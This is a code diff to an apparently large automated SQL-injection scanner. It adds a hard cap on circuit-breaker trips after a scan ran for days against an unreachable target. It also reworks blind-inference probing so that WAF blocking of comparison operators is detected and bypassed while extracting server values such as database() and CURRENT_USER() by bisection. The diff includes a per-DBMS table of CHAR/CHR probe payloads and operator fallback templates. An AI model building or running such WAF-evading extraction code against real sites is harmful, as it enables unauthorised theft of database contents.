@@ -32609,6 +32609,20 @@ class GlobalRequestGate:
                                   f"target permanently WAF-blocked, killing scan permanently", flush=True)
                     else:
                         self._cb_rapid_trips = 0
+                    # BUG-CB-INFINITE-LOOP FIX (CRITICAL): The rapid-re-trip window (360s) is
+                    # smaller than a single CB cycle when errors are slow (e.g. 10 × 30s timeout
+                    # + 300s pause = 600s per cycle).  The rapid-trip counter never increments
+                    # because _now_rt - _cb_last_recovery > 360 on every trip, so the scan loops
+                    # indefinitely cycling CB open/close.  Observed: script ran for 3+ days
+                    # (log1.txt, 192,135 lines) before being killed via Ctrl+C.
+                    # Fix: hard-cap total CB trips at _MAX_CB_TRIPS.  After this many trips the
+                    # target is clearly unreachable regardless of the rapid-trip window timing.
+                    _MAX_CB_TRIPS = 8
+                    if self._circuit_trip_count >= _MAX_CB_TRIPS:
+                        self.kill()
+                        print(f"[!] [Gate] CB trip #{self._circuit_trip_count} — "
+                              f"max ({_MAX_CB_TRIPS}) reached, target permanently unreachable, "
+                              f"killing scan", flush=True)
 
             elif error:
                 self._consecutive_ok = 0
@@ -32659,6 +32673,17 @@ class GlobalRequestGate:
                                       f"killing scan permanently", flush=True)
                         else:
                             self._cb_rapid_trips = 0
+                        # BUG-CB-INFINITE-LOOP FIX (CRITICAL): The rapid-re-trip window (360s) is
+                        # smaller than a single CB cycle when errors are slow (e.g. 10 × 30s
+                        # timeout + 300s pause = 600s per cycle). The rapid-trip counter never
+                        # increments because _now_rt - _cb_last_recovery > 360 on every trip,
+                        # so the scan loops indefinitely. Hard-cap at _MAX_CB_TRIPS total trips.
+                        _MAX_CB_TRIPS = 8
+                        if self._circuit_trip_count >= _MAX_CB_TRIPS:
+                            self.kill()
+                            print(f"[!] [Gate] CB trip #{self._circuit_trip_count} — "
+                                  f"max ({_MAX_CB_TRIPS}) reached, target permanently unreachable, "
+                                  f"killing scan", flush=True)
                 elif self._consecutive_fail >= 3:
                     old = self._delay
                     self._delay = min(self._max_delay, self._delay * 2.0 + 0.5)
@@ -60382,21 +60407,56 @@ class Scanner:
             """Test if > works with extraction payload, try alternatives if not."""
             nonlocal _op_char_tpl, _waf_blocks_gt, _use_bitwise_fallback, _len_tpl  # BUG-PROBE-OPERATOR-NONLOCAL-FIX: added _len_tpl
 
+            # BUG-PROBE-OPERATOR-LITERAL-Z FIX (CRITICAL): The original test used
+            # "SELECT 'z'" — a string literal.  WAFs that block comparison operators
+            # when used with SQL functions (database(), current_user(), ASCII(SUBSTRING(...)))
+            # allow literal-string comparisons because literals don't extract server state.
+            # Testing with 'z' falsely concludes the operator works; actual extraction with
+            # database()/CURRENT_USER() gets all probes WAF-blocked (returning 403=True in
+            # the boolean oracle), causing bisection to climb to 1,114,111 (Unicode ceiling),
+            # producing garbage like "aaaabaaaaaaaabbaaaaaaaaaa" (observed in production log:
+            # 2800+ seconds of wasted extraction before _is_garbage finally caught it).
+            # Fix: use a DBMS-specific SQL function call (CHAR(122)/CHR(122)/ASCII_CHAR(122))
+            # that returns a known value ('z'=ASCII 122). A WAF that blocks function-based
+            # comparison operators will also block CHAR(122).  Verify BOTH sides of the
+            # comparison: mid=64 must be True (122>=64) AND mid=200 must be False (122<200).
+            # A single-side True-only check is insufficient — a WAF blocking all comparisons
+            # returns 403=True for every probe, so True alone cannot distinguish "works"
+            # from "WAF blocks everything and returns True for all probes".
+            _dbms_char_fn_probe = {
+                "MySQL": "CHAR(122)", "MariaDB": "CHAR(122)", "TiDB": "CHAR(122)",
+                "PostgreSQL": "CHR(122)", "CockroachDB": "CHR(122)",
+                "YugabyteDB": "CHR(122)", "Amazon Redshift": "CHR(122)",
+                "MSSQL": "CHAR(122)", "Sybase": "CHAR(122)", "Oracle": "CHR(122)",
+                "SQLite": "CHAR(122)", "DB2": "CHR(122)", "Firebird": "ASCII_CHAR(122)",
+                "H2": "CHR(122)", "Informix": "CHR(122)", "SAP_HANA": "CHAR(122)",
+                "ClickHouse": "char(122)",
+            }.get(_dbms, "CHAR(122)")
+
             # Step 1: Simple test  if 1>0 works (already tested by _confirm_dbms),
             # the > operator itself is NOT blocked. Skip alternatives.
             _simple = await _eval("1>0")
             if _simple is True:
-                # > works for simple conditions. Now test with actual extraction pattern.
-                _test = _char_tpl.replace("[QUERY]", "SELECT " + _quote("z")).replace("{pos}", "1").replace("{mid}", "64")
-                r = await _eval(_test)
-                if r is True:
-                    LOG.info("[Inference] Operator > works with extraction pattern ")
+                # > works for simple conditions. Now test with actual extraction pattern
+                # using a SQL function call (not a literal) so WAF function-blocking shows.
+                # Verify BOTH sides: True (mid=64, 122>=64) AND False (mid=200, 122<200).
+                _test_t = _char_tpl.replace("[QUERY]", "SELECT " + _dbms_char_fn_probe).replace("{pos}", "1").replace("{mid}", "64")
+                _test_f = _char_tpl.replace("[QUERY]", "SELECT " + _dbms_char_fn_probe).replace("{pos}", "1").replace("{mid}", "200")
+                r_t = await _eval(_test_t)
+                await asyncio.sleep(_delay)
+                r_f = await _eval(_test_f)
+                if r_t is True and r_f is False:
+                    LOG.info("[Inference] Operator > works with extraction pattern "
+                             "(verified via %s: mid=64→True, mid=200→False)", _dbms_char_fn_probe)
                     return
                 else:
-                    # > works but extraction pattern fails  issue is PAYLOAD COMPLEXITY
-                    # not the operator. Binary search with > will still fail.
-                    LOG.info("[Inference] > works but extraction pattern too complex for WAF")
-                    _waf_blocks_gt = True  # Extraction will fail with >, use equality
+                    # > fails with extraction pattern: either WAF blocks all function-based
+                    # comparisons (returns 403=True for everything → r_f is also True), or the
+                    # payload is too complex for the WAF. Either way, equality/bitwise needed.
+                    LOG.info("[Inference] > fails with extraction pattern "
+                             "(r_true=%s, r_false=%s via %s) — WAF blocking function comparisons",
+                             r_t, r_f, _dbms_char_fn_probe)
+                    _waf_blocks_gt = True  # Extraction will fail with >, use equality/bitwise
                     return
 
             # Step 2: > truly blocked  try alternatives
@@ -60465,7 +60525,7 @@ class Scanner:
                 _ALT_CHAR["gte"] = _re.sub(r'>\{mid\}', '>={mid}', _base, flags=_re.I)
             # Note: gte/not_lt/between are >= semantics  bisection uses mid+1
             for _aname, _atpl in _ALT_CHAR.items():
-                _test2 = _atpl.replace("[QUERY]", "SELECT " + _quote("z")).replace("{pos}", "1").replace("{mid}", "64")
+                _test2 = _atpl.replace("[QUERY]", "SELECT " + _dbms_char_fn_probe).replace("{pos}", "1").replace("{mid}", "64")
                 # CRITICAL FIX: Pass only the CONDITION to _send_payload, NOT the pre-substituted
                 # full payload. _send_payload already substitutes inference_cond into _template.
                 # The old code passed _template.replace("[INFERENCE]", _test2) as inference_cond,
@@ -60476,7 +60536,7 @@ class Scanner:
                 # → bitwise fallback forced even when BETWEEN/gte would work fine.
                 _, ms2 = await _send_payload(_test2)
                 await asyncio.sleep(_delay)
-                _test2f = _atpl.replace("[QUERY]", "SELECT " + _quote("z")).replace("{pos}", "1").replace("{mid}", "200")
+                _test2f = _atpl.replace("[QUERY]", "SELECT " + _dbms_char_fn_probe).replace("{pos}", "1").replace("{mid}", "200")
                 _, ms2f = await _send_payload(_test2f)
                 if _boolean_oracle:
                     # Boolean oracle: check using _eval (body/status/header diff), not timing.
